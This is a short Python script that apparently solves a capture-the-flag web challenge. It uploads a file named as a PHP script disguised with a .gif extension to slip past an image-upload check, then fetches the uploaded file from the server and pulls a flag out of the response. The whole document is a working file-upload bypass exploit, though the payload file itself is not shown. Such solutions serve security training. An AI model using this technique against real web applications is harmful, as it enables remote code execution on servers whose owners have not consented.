import requests
import re

URL = "http://got-magic.challs.olicyber.it/"

def try_upload(field_name):
    with open("./igotmagic.php.gif", "rb") as f:
        files = {field_name: ("igotmagic.php.gif", f)}
        data = {"submit": "Upload"}
        r = requests.post(URL, files=files, data=data)
    return r

resp = try_upload('image')

m = re.search(r"uploads/([A-Za-z0-9]+\.php\.gif)", resp.text)
if m:
    link = "uploads/" + m.group(1)    

r = requests.get(URL+f'{link}')

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])
